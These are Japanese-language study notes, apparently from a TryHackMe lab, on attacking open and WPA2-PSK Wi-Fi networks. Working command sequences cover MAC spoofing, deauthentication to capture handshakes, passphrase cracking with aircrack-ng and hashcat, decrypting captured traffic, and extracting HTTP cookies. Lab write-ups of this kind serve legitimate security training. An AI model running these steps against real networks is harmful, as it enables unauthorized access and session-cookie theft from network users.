# オープンネットワークとWPA2-PSK

https://tryhackme.com/room/attackingopenandwpa2psknetworks

## オープンネットワーク

オープンネットワークは通信が暗号化されないので誰でも傍受できる。

### ゲストWiFiへの参加

```sh
cat guest-open.conf

network={
    ssid="Guest-WiFi"
    key_mgmt=NONE
}
```

```sh
sudo wpa_supplicant -B -i wlan2 -c guest-open.conf

# DHCPでアクセスポイントからIPアドレスを要求
sudo dhclient wlan2
```

### MACアドレスの偽装

```sh
# アクセスポイントに関連付けられているステーションのMACアドレスを取得
sudo airodump-ng -c 6 --bssid F0:9F:C2:71:22:10 wlan0mon
```

```sh
# MACアドレスを偽装してインターフェースを再起動
sudo ip link set wlan2 down
sudo macchanger -m 80:18:44:BF:72:47 wlan2
sudo ip link set wlan2 up
```

### ネットワークを傍受

```sh
# opn-01.cap 等にファイル出力される
sudo airodump-ng -c 6 --bssid F0:9F:C2:71:22:10 -w opn wlan0mon

# cookie を表示
sudo tshark -r opn-01.cap -Y http.cookie -T fields -e ip.src -e http.cookie
```

## WPA2-PSK

- PSKはPre-Shared Key（事前共有キー）の略で、WPA2-Personalとも呼ばれる。  
- WPA2-PSKは通信中のトラフィックを暗号化する。  
- 単一のパスフレーズでネットワークを保護し、すべてのデバイスで共有される。
- クラックには4-wayハンドシェイクのキャプチャ、ネットワーク名、パスワードリストが必要。つまり、パスフレーズが脆弱な場合にクラック可能になる。
- 認証解除フレームの送信元を偽装できるので、4-wayハンドシェイクを発生させることができる。

### キャプチャ

```sh
# キャプチャを開始
sudo airodump-ng -c 6 --bssid F0:9F:C2:71:22:12 -w home2g wlan0mon

# 別のターミナルで認証解除
# ハンドシェイクをキャプチャできたら、キャプチャ画面のNoteにEAPOLと表示される。
sudo aireplay-ng -0 6 -a F0:9F:C2:71:22:12 -c 28:6C:07:6F:F9:43 wlan0mon
```

### パスフレーズのクラック

```sh
# パスフレーズをリストを使ってクラック
sudo aircrack-ng -w /home/user/wordlists/wifi-passwords.txt -b F0:9F:C2:71:22:12 home2g-01.cap
```

```sh
# hashcat を使ってクラックする方法（GPU）
sudo hcxpcapngtool -o home2g.22000 home2g-01.cap

hashcat -m 22000 home2g.22000 /home/user/wordlists/wifi-passwords.txt
hashcat -m 22000 home2g.22000 --show
```

### 接続

```sh
# ヘルパーで設定ファイルを作成
wpa_passphrase <ssid> <passphrase> > home2g.conf

# 関連付け
sudo wpa_supplicant -B -i wlan1 -c home2g.conf

# 確認
sudo iw dev wlan1 link

# DHCP
sudo dhclient -v wlan1
```

### サブネットのマッピング

```sh
# クライアント分離されている場合、デフォルトゲートウェイのみ検出される
sudo nmap -sn 192.168.2.0/24

# デフォルトゲートウェイでHTTPサービスが稼働しているとしたら管理インターフェース
sudo nmap -Pn 192.168.2.1
```

### 盗聴

```sh
# 認証解除をキャプチャ
sudo airodump-ng -c 6 --bssid F0:9F:C2:71:22:12 -w home2g-http wlan0mon

sudo aireplay-ng -0 6 -a F0:9F:C2:71:22:12 -c 28:6C:07:6F:F9:43 wlan0mon
```

```sh
# パスフレーズを使って復号
sudo airdecap-ng -e Home-2G -p <passphrase> home2g-http-01.cap
```

```sh
# cookieを抽出
sudo tshark -r home2g-http-01-dec.cap -Y http.cookie -T fields -e ip.src -e http.cookie
```
